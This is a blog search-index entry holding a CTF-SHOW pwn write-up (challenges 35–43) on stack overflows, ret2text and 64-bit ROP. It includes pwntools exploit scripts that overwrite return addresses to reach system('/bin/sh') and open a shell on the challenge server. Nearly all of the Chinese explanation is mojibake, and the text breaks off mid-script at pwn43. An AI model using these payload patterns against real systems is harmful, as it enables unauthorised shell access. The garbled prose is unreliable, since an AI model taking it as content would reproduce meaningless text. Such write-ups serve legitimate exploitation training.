<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-SHOW åˆ·é¢˜è®°å½•</title>
      <link href="/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/03/18/%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote><p>pwn35~110</p></blockquote><h2 id="pwn35ï¼ˆæ•°ç»„æº¢å‡ºï¼‰"><a href="#pwn35ï¼ˆæ•°ç»„æº¢å‡ºï¼‰" class="headerlink" title="pwn35ï¼ˆæ•°ç»„æº¢å‡ºï¼‰"></a>pwn35ï¼ˆæ•°ç»„æº¢å‡ºï¼‰</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316194041817.png" alt="image-20250316194041817" style="zoom: 50%;"><p>æ•°ç»„æº¢å‡ºï¼Œè¾“å…¥ä¸€ä¸ªè¶…é•¿å­—ç¬¦ä¸²å³å¯</p><h2 id="pwn36ï¼ˆåé—¨å‡½æ•°ç›´æ¥å¾—åˆ°flagï¼‰"><a href="#pwn36ï¼ˆåé—¨å‡½æ•°ç›´æ¥å¾—åˆ°flagï¼‰" class="headerlink" title="pwn36ï¼ˆåé—¨å‡½æ•°ç›´æ¥å¾—åˆ°flagï¼‰"></a>pwn36ï¼ˆåé—¨å‡½æ•°ç›´æ¥å¾—åˆ°flagï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203127145.png" alt="image-20250316203127145"></p><p>çœ‹å‡†äº†è¿™ä¸ªctfshowå‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203146247.png" alt="image-20250316203146247" style="zoom: 80%;"><p>è¿™é‡Œä½¿ç”¨äº†getså‡½æ•°è¯»å–sæ•°ç»„ï¼Œä¸”æ­¤ç¨‹åºæ²¡æœ‰æ ˆæº¢å‡ºä¿æŠ¤ï¼Œæ•…åœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œæ ˆæº¢å‡ºæ”»å‡»ã€‚</p><p>åŒæ—¶é¢˜ç›®æç¤ºæœ‰åé—¨å‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203321679.png" alt="image-20250316203321679" style="zoom: 67%;"><p>æŸ¥çœ‹è¿™ä¸ªget_flagå‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316203344392.png" alt="image-20250316203344392" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fgetså‡½æ•°ï¼šchar* fgets(char *restrict str, int size , FILE* restrict stream)</span><br><span class="line"></span><br><span class="line">char *fgets(â€œå®¹å™¨çš„åœ°å€â€ï¼Œ â€œå®¹å™¨çš„å¤§å°â€ï¼Œ â€œä»å“ªé‡Œè¯»å–â€ï¼‰</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯</p><ul><li>å°†ctfshowå‡½æ•°çš„è¿”å›åœ°å€å¡«å……ä¸ºget_flagå‡½æ•°çš„è¿”å›åœ°å€</li></ul><p>æŸ¥çœ‹get_flagå‡½æ•°çš„åœ°å€</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204824640.png" alt="image-20250316204824640" style="zoom:67%;"><p>ä¸º0x08048586</p><p>æ•´ä½“æ€è·¯ä¸ºï¼š</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316204914827.png" alt="image-20250316204914827" style="zoom:50%;"><p>ï¼ˆå½“ç„¶è¿˜æœ‰ä¸€æˆªprevious ebpï¼‰ï¼Œæ‰€ä»¥è·ç¦»è¿”å›åœ°å€çš„é•¿åº¦ä¸º0x28+4</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28183</span>)</span><br><span class="line">flag_addr = <span class="number">0x08048586</span></span><br><span class="line">payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(flag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn37ï¼ˆ32ä½åé—¨å‡½æ•°è·å¾—shellï¼‰"><a href="#pwn37ï¼ˆ32ä½åé—¨å‡½æ•°è·å¾—shellï¼‰" class="headerlink" title="pwn37ï¼ˆ32ä½åé—¨å‡½æ•°è·å¾—shellï¼‰"></a>pwn37ï¼ˆ32ä½åé—¨å‡½æ•°è·å¾—shellï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211622179.png" alt="image-20250316211622179"></p><p>æ€»çš„æ¥è¯´å’Œä¸Šé“é¢˜å¤§å·®ä¸å·®ï¼Œinitæ¸…ç©ºç¼“å†²åŒºï¼Œlogoå’Œputsæ‰“å°ä¿¡æ¯ã€‚åªæœ‰ctfshowæ˜¯æŒºå…³é”®çš„</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316211716861.png" alt="image-20250316211716861" style="zoom:80%;"><p>bufæ•°ç»„é•¿14ï¼Œè¯»å…¥äº†0x32é•¿çš„æ•°æ®ï¼Œæ•…å¯ä»¥å®ç°æ ˆæº¢å‡º</p><p>é¢˜ç›®æç¤ºæœ‰åé—¨å‡½æ•°ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°åé—¨å‡½æ•°çš„é¢èµ·å§‹åœ°å€å³å¯</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212051633.png" alt="image-20250316212051633" style="zoom: 67%;"><p>æ•…åé—¨å‡½æ•°åœ°å€ä¸º 0x08048521</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28281</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x08048521</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(backdoor_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ã€-ã€‘pwn38ï¼ˆ64ä½åé—¨å‡½æ•°è·å¾—shellï¼‰"><a href="#ã€-ã€‘pwn38ï¼ˆ64ä½åé—¨å‡½æ•°è·å¾—shellï¼‰" class="headerlink" title="ã€*ã€‘pwn38ï¼ˆ64ä½åé—¨å‡½æ•°è·å¾—shellï¼‰"></a>ã€*ã€‘pwn38ï¼ˆ64ä½åé—¨å‡½æ•°è·å¾—shellï¼‰</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316212903030.png" alt="image-20250316212903030" style="zoom:67%;"><p>é¢˜ç›®å¯ä»¥è¯´æ˜¯å®Œå…¨ä¸€æ ·ï¼Œä½†æ˜¯é¢˜ç›®è¯´æ˜¯64ä½ç³»ç»Ÿã€‚æ”¾è¿›checksecé‡Œçœ‹çœ‹å°±å¥½äº†</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213228954.png" alt="image-20250316213228954" style="zoom: 67%;"><p>æ³¨æ„32ä½å’Œ64ä½çš„åŒºåˆ«ã€‚é¦–å…ˆcontextè¦è®¾ç½®ä¸€ä¸‹ï¼Œç„¶åæ³¨æ„å¯„å­˜å™¨å’Œåœ°å€éƒ½æ˜¯å…«ä¸ªå­—èŠ‚</p><p>æ‰¾åˆ°åé—¨å‡½æ•°åœ°å€</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316213329394.png" alt="image-20250316213329394" style="zoom:67%;"><p>0x400657ï¼Ÿ</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">ret_addr = <span class="number">0x400657</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">8</span> * <span class="string">b&#x27;b&#x27;</span> + p64(ret_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ç»“æœå‡ºæ¥æ˜¯é”™çš„ï¼Œä¸ºä»€ä¹ˆ</p><p>è¿™æ˜¯å› ä¸º64ä½ç³»ç»Ÿè¿˜éœ€è¦å¤„ç†**<font color="red">å †æ ˆå¹³è¡¡</font>**</p><blockquote><p>å½“æˆ‘ä»¬åœ¨å †æ ˆè¿›è¡Œå †æ ˆçš„æ“ä½œçš„æ—¶å€™ï¼Œä¸€å®šè¦ä¿è¯åœ¨retè¿™æ¡æŒ‡ä»¤ä¹‹å‰ï¼ŒespæŒ‡å‘çš„æ˜¯æˆ‘ä»¬å‹å…¥æ ˆä¸­çš„åœ°å€ï¼Œå‡½æ•°æ‰§è¡Œåˆ°retæ‰§è¡Œä¹‹å‰ï¼Œå †æ ˆæ ˆé¡¶çš„åœ°å€ä¸€å®šè¦æ˜¯callæŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªåœ°å€</p></blockquote><p>å› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æ‰¾ä¸€ä¸ªåœ°å€ï¼š lev çš„åœ°å€æˆ–è€…è¯¥å‡½æ•°ç»“æŸçš„åœ°å€ï¼ˆå³ retn çš„åœ°å€ï¼‰</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316215415314.png" alt="image-20250316215415314" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°</p><p>levçš„åœ°å€ï¼š0x40065b</p><p>retnçš„åœ°å€ï¼š0x+40066d</p><p><strong><font color="blue">ç‰¹åˆ«æ³¨æ„ï¼šæ„é€  payload æ—¶å°†è¯¥åœ°å€æ”¾åœ¨è¯¥å‡½æ•°å¼€å§‹åœ°å€ä¹‹å‰</font></strong></p><h3 id="exp2-0"><a href="#exp2-0" class="headerlink" title="exp2.0"></a>exp2.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lev_addr = <span class="number">0x40065b</span></span><br><span class="line">payload = <span class="number">10</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">8</span> * <span class="string">b&#x27;b&#x27;</span> + p64(lev_addr) +p64(ret_addr)</span><br></pre></td></tr></table></figure><h2 id="pwn39ï¼ˆ32ä½åé—¨å‡½æ•°systemä¸å‚æ•°åˆ†ç¦»ï¼‰"><a href="#pwn39ï¼ˆ32ä½åé—¨å‡½æ•°systemä¸å‚æ•°åˆ†ç¦»ï¼‰" class="headerlink" title="pwn39ï¼ˆ32ä½åé—¨å‡½æ•°systemä¸å‚æ•°åˆ†ç¦»ï¼‰"></a>pwn39ï¼ˆ32ä½åé—¨å‡½æ•°systemä¸å‚æ•°åˆ†ç¦»ï¼‰</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220015294.png" alt="image-20250316220015294" style="zoom:67%;"><p>è¿˜æ˜¯æˆ‘ä»¬å–œé—»ä¹è§çš„32ä½ret2text</p><p>åªä¸è¿‡è¿™é‡Œçš„åé—¨ä¸æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220118547.png" alt="image-20250316220118547"></p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250316220845813.png" alt="image-20250316220845813" style="zoom:50%;"><p>è¿™é‡Œå°†<code>/bin/sh</code>å’Œ<code>system</code>å‡½æ•°åˆ†å¼€äº†</p><p>&#x2F;bin&#x2F;shçš„åœ°å€ï¼š0x08048750</p><p>system()çš„åœ°å€ï¼š0x080483A0</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317091227011.png" alt="image-20250317091227011" style="zoom:50%;"><p>è¿™å¼ å›¾æ˜¯ä¾¿äºä¹ æƒ¯çš„ï¼ŒçœŸå®çš„æƒ…å†µå¦‚ä¸‹å›¾</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png" alt="image-20241117141336080" style="zoom: 50%;"><p>è¿™é‡Œä»ctfshowå‡½æ•°è·³è½¬åˆ°äº†systemå‡½æ•°</p><p>æˆ‘ä»¬è¦åšçš„æ˜¯å°†è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°ï¼Œå¹¶å°†å‚æ•°1å¡«å……ä¸Š&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ã€‚ï¼ˆæ³¨æ„è¿™é‡Œçš„å‚æ•°ä¸èƒ½æ˜¯&#x2F;bin&#x2F;shæ•´ä¸ªå­—ç¬¦ä¸²ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ¬èº«è¢«ç¡¬ç¼–ç ä¸ºrodataèŠ‚ä¸­ï¼Œè¦ä¼ é€’åªèƒ½é€šè¿‡åœ°å€ï¼‰</p><p>åç§»é‡æ˜¯ï¼š12h + 4</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318094735493.png" alt="image-20250318094735493"></p><p>è¿™ä¸ªexitå¯ä»¥æ˜¯ä»»æ„åœ°å€ï¼Œå¦‚0xdeadbeef(64bit)</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28191</span>)</span><br><span class="line">str_addr = <span class="number">0x08048750</span></span><br><span class="line">sys_addr = <span class="number">0x080483A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x12</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(sys_addr) + <span class="string">b&#x27;c&#x27;</span> * <span class="number">4</span> + p32(str_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn40ï¼ˆ64ä½åé—¨å‡½æ•°ä¸å‚æ•°åˆ†ç¦»ï¼ˆROPï¼‰ï¼‰"><a href="#pwn40ï¼ˆ64ä½åé—¨å‡½æ•°ä¸å‚æ•°åˆ†ç¦»ï¼ˆROPï¼‰ï¼‰" class="headerlink" title="pwn40ï¼ˆ64ä½åé—¨å‡½æ•°ä¸å‚æ•°åˆ†ç¦»ï¼ˆROPï¼‰ï¼‰"></a>pwn40ï¼ˆ64ä½åé—¨å‡½æ•°ä¸å‚æ•°åˆ†ç¦»ï¼ˆROPï¼‰ï¼‰</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317092724016.png" alt="image-20250317092724016" style="zoom:67%;"><p>å‘ç°æ˜¯64ä½ç³»ç»Ÿã€‚ä¸¤è€…å·®å¼‚å¦‚ä¸‹ï¼š</p><ul><li>x86<ul><li>ä½¿ç”¨æ ˆæ¥ä¼ é€’å‚æ•°</li><li>ä½¿ç”¨eaxå­˜æ”¾è¿”å›å€¼</li></ul></li><li>x64<ul><li>å‰6ä¸ªå‚æ•°ä¾æ¬¡å­˜æ”¾äºrdiã€rsiã€rdxã€rcxã€r8ã€r9å¯„å­˜å™¨ä¸­</li><li>ç¬¬7ä¸ªä»¥åçš„å‚æ•°å­˜æ”¾äºæ ˆä¸­</li></ul></li></ul><p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦æ§åˆ¶rdiçš„å€¼</p><p>åˆ©ç”¨<strong>ROP</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317093554911.png" alt="image-20250317093554911" style="zoom:67%;"><p>æˆ‘ä»¬ä½¿ç”¨pop rdiï¼›retå³å¯ï¼Œåœ°å€ä¸º 0x4007e3</p><p>retçš„åœ°å€ä¸ºï¼š0x4004fe</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317094655085.png" alt="image-20250317094655085" style="zoom:50%;"><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28150</span>)</span><br><span class="line">offset = <span class="number">0xa</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">bin_sh_addr = <span class="number">0x400808</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn41ï¼ˆ32ä½shæ›¿æ¢-bin-shï¼‰"><a href="#pwn41ï¼ˆ32ä½shæ›¿æ¢-bin-shï¼‰" class="headerlink" title="pwn41ï¼ˆ32ä½shæ›¿æ¢&#x2F;bin&#x2F;shï¼‰"></a>pwn41ï¼ˆ32ä½shæ›¿æ¢&#x2F;bin&#x2F;shï¼‰</h2><p>æ­£å¦‚é¢˜ç›®æ‰€è¯´ï¼Œæ²¡æœ‰&#x2F;bin&#x2F;shäº†ï¼Œä½†æ˜¯åˆsystemå‡½æ•°å’Œ â€echo flagâ€œå­—ç¬¦ä¸²ï¼Œä»¥åŠâ€œshâ€å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141526361.png" alt="image-20250317141526361"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141617461.png" alt="image-20250317141617461" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317141627070.png" alt="image-20250317141627070" style="zoom:50%;"></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œshå’Œ&#x2F;bin&#x2F;shæ˜¯ç­‰æ•ˆçš„</p><ol><li>system(â€œ&#x2F;bin&#x2F;shâ€)ï¼šåœ¨Linuxå’Œç±»Unixç³»ç»Ÿä¸­ï¼Œ&#x2F;bin&#x2F;shé€šå¸¸æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘<strong>ç³»ç»Ÿé»˜è®¤çš„shellç¨‹åºï¼ˆå¦‚Bashæˆ–Shellï¼‰</strong>ã€‚å› æ­¤ï¼Œä½¿ç”¨system(â€œ&#x2F;bin&#x2F;shâ€)ä¼š<strong>å¯åŠ¨æŒ‡å®šçš„shellç¨‹åºå¹¶åœ¨æ–°çš„å­è¿›ç¨‹ä¸­æ‰§è¡Œ</strong>ã€‚è¿™ç§æ–¹å¼å¯ä»¥ç¡®ä¿ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„shellç¨‹åºæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸º&#x2F;bin&#x2F;shé“¾æ¥é€šå¸¸æŒ‡å‘é»˜è®¤shellçš„å¯æ‰§è¡Œæ–‡ä»¶</li><li>system(â€œshâ€)ï¼šä½¿ç”¨system(â€œshâ€)ä¼š<strong>ç›´æ¥å¯åŠ¨ä¸€ä¸ªåä¸ºshçš„shellç¨‹åºï¼Œå¹¶åœ¨æ–°çš„å­è¿›ç¨‹ä¸­æ‰§è¡Œ</strong>ã€‚è¿™ç§æ–¹å¼å‡è®¾ç³»ç»Ÿçš„<strong>ç¯å¢ƒå˜é‡$PATHå·²ç»é…ç½®</strong>äº†èƒ½å¤Ÿæ‰¾åˆ°shå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´æ‰¾ä¸åˆ°shè€Œæ‰§è¡Œå¤±è´¥ã€‚</li></ol><p>æ‰€ä»¥è¿˜æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æŠŠ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²æ¢æˆshè€Œå·²</p><p>systemå‡½æ•°ä½ç½®ï¼š0x080483D0</p><p>shå­—ç¬¦ä¸²ä½ç½®ï¼š0x080487BA</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28297</span>)</span><br><span class="line">system_addr = <span class="number">0x080483D0</span></span><br><span class="line">sh_addr = <span class="number">0x080487BA</span></span><br><span class="line">payload = <span class="number">0x12</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">4</span> * <span class="string">b&#x27;b&#x27;</span> + p32(system_addr) + <span class="number">4</span> * <span class="string">b&#x27;c&#x27;</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn42ï¼ˆ64ä½-shæ›¿æ¢-bin-shï¼ˆROPï¼‰ï¼‰"><a href="#pwn42ï¼ˆ64ä½-shæ›¿æ¢-bin-shï¼ˆROPï¼‰ï¼‰" class="headerlink" title="pwn42ï¼ˆ64ä½&#x2F;shæ›¿æ¢&#x2F;bin&#x2F;shï¼ˆROPï¼‰ï¼‰"></a>pwn42ï¼ˆ64ä½&#x2F;shæ›¿æ¢&#x2F;bin&#x2F;shï¼ˆROPï¼‰ï¼‰</h2><p>å’Œä¸Šé“é¢˜çš„æ¼æ´ä¸€æ ·ï¼Œä¸è¿‡æ˜¯64ä½ç³»ç»Ÿ</p><p> åç§»é‡ï¼š0xa</p><p>systemå‡½æ•°åœ°å€ï¼š0x400560</p><p>shå­—ç¬¦ä¸²ä½ç½®ï¼š0x400872</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317143350570.png" alt="image-20250317143350570" style="zoom:67%;"><p>pop_rdi_retåœ°å€ï¼š0x400843</p><p>retåœ°å€ï¼š0x40053e</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28269</span>)</span><br><span class="line">system_addr = <span class="number">0x400560</span></span><br><span class="line">sh_addr = <span class="number">0x400872</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400843</span></span><br><span class="line">ret_addr = <span class="number">0x40053e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(ret_addr) +p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn43ï¼ˆ32ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰"><a href="#pwn43ï¼ˆ32ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰" class="headerlink" title="pwn43ï¼ˆ32ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰"></a>pwn43ï¼ˆ32ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰</h2><p>32ä½ç³»ç»Ÿ</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144157630.png" alt="image-20250317144157630" style="zoom:67%;"><p>getså‡½æ•°å¯¼è‡´æ ˆæº¢å‡º</p><p>æŸ¥çœ‹åé—¨å‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144316276.png" alt="image-20250317144316276" style="zoom:67%;"><p>è¿™æ¬¡çš„åé—¨å‡½æ•°ä¼¼ä¹æœ‰ç‚¹å¤æ‚</p><p>é¦–å…ˆv0ä½œä¸ºç§å­ï¼Œå€¼ä¸ºtime(0)</p><p>æ¥ç€v3ä¸ºv0ä½œä¸ºç§å­çš„éšæœºæ•°</p><p>ç„¶åéœ€è¦è¾“å…¥ä¸€ä¸ªæ•°ï¼šv2</p><p>å¦‚æœv2å’Œç”Ÿæˆçš„éšæœºæ•°ç›¸åŒï¼Œåˆ™è¿›å…¥systemå‡½æ•°</p><p>ç ´è§£éšæœºæ•°æ˜¯ä¸‹ç­–</p><p>æˆ‘ä»¬æ‰¾åˆ°ä¸€æ®µå¯å†™åŒºåŸŸ</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145903183.png" alt="image-20250317145903183" style="zoom:67%;"><p>å®é™…ä¸Šè¿™åœ¨bssæ®µï¼Œå…¶ä¸­è¿˜æœ‰ä¸€ä¸ªbuf2æ•°ç»„</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145919246.png" alt="image-20250317145919246" style="zoom:67%;"><p>æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå†™å…¥&#x2F;bin&#x2F;sh</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317192647582.png" alt="image-20250317192647582" style="zoom:67%;"><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 